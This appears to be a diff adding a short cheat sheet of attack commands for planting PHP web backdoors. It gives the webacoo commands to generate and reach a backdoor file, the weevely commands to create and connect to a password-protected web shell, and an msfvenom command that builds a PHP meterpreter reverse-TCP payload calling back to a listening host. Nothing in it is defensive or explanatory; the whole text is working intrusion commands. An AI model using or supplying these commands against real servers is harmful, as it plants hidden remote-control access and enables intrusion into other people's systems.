@@ -1,0 +1,11 @@
+1) generate the backdoor file
+webacoo -g -o test.php
+
+2) In client, visit the url
+webacoo -t -u http://192.168.0.1/test.php
+
+weevely
+Server: weevely generate password /tmp/display.php
+Client: weevely http://192.168.0.117/display.php password
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 -f raw > php-meter.php
